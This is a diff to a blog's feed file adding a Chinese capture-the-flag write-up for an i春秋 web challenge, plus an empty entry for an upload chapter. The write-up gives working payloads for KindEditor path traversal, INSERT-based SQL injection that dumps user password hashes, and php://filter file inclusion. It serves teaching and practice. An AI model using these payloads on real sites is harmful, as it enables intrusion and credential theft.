@@ -4,6 +4,38 @@
   
     
     <entry>
+      <title>i春秋:Web-Blog</title>
+      <link href="2021/05/18/i-chun-qiu-web-blog/"/>
+      <url>2021/05/18/i-chun-qiu-web-blog/</url>
+      
+        <content type="html"><![CDATA[<p><img src="/2021/05/18/i-chun-qiu-web-blog/af732d2efa39b352f28282731713236.png" alt="af732d2efa39b352f28282731713236"></p><p><img src="/2021/05/18/i-chun-qiu-web-blog/2f76efeb2524974afe648a1e5273c0c.png" alt="2f76efeb2524974afe648a1e5273c0c"></p><p>得到路径：  /kindeditor/php/upload_json.php</p><p> 知道编辑版为 kindeditor，搜索相关漏洞，得到利用</p><pre><code> /kindeditor/php/file_manager_json.php?path=/</code></pre><p>访问：</p><pre><code>/kindeditor/php/file_manager_json.php?path=../../ </code></pre><p><img src="/2021/05/18/i-chun-qiu-web-blog/d879bbe9821057bd315346509fae17e.png" alt="d879bbe9821057bd315346509fae17e"></p><p>尝试注入：</p><pre><code>title=1' and '1'='1  返回1 </code></pre><pre><code>title=1' and '1'='2  返回0 </code></pre><p> 了解到这是一个insert注入</p><p> insert into table(columns) values(A1,B1,C1)</p><p><img src="/2021/05/18/i-chun-qiu-web-blog/05e4af14c2cb7fff3f502993faf7a5a.png" alt="05e4af14c2cb7fff3f502993faf7a5a"></p><pre><code>title=p1&amp;content=1','1'),('aaa',(database()),'1</code></pre><pre><code>title=p2&amp;content=1','1'),('aaa',(SELECT group_concat(table_name) from information_schema.tables where table_schema=database()),'2</code></pre><pre><code>title=p3&amp;content=1','1'),('aaa',(SELECT group_concat(column_name) from information_schema.columns where table_name='users'),'3</code></pre><pre><code>title=p4&amp;content=1','1'),('aaa',(SELECT group_concat(password) from users),'4</code></pre><p>依次尝试结果如下：</p><p><img src="/2021/05/18/i-chun-qiu-web-blog/bdb25940d7171a3b6273fc98dc56960.png" alt="bdb25940d7171a3b6273fc98dc56960"></p><ul><li>dbb616c5d935d8f34c12c291066d6fb7</li><li>202cb962ac59075b964b07152d234b70</li><li>250cf8b51c773f3f8dc8b4be867a9a02</li><li>68053af2923e00204c3ca7c6a3150cf7</li></ul><p>解密为： melody123 123 456 789</p><p>访问admin melody123</p><pre><code>http://0ecb2feb6f4c483b8ac915b0e3a6c841369800c33d7945ee.changame.ichunqiu.com/blog_manage/manager.php?module=article_manage&amp;name=php</code></pre><p>可能存在文件包含</p><pre><code>http://0ecb2feb6f4c483b8ac915b0e3a6c841369800c33d7945ee.changame.ichunqiu.com/blog_manage/manager.php?module=php://filter/read=convert.base64-encode/resource=../flag&amp;name=php</code></pre><p><img src="/2021/05/18/i-chun-qiu-web-blog/f7ec6bb8b94fba17307d1752a124d19.png" alt="f7ec6bb8b94fba17307d1752a124d19"></p><p>base64解码得到flag</p><p><img src="/2021/05/18/i-chun-qiu-web-blog/2325cb6cebbefed58516c4d5d1b3e80.png" alt="2325cb6cebbefed58516c4d5d1b3e80"></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> i春秋 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>《从0到1：CTFer成长之路》：Web-Upload</title>
+      <link href="2021/05/17/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-upload/"/>
+      <url>2021/05/17/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-upload/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>《从0到1：CTFer成长之路》:Web-XSS闯关</title>
       <link href="2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/"/>
       <url>2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/</url>
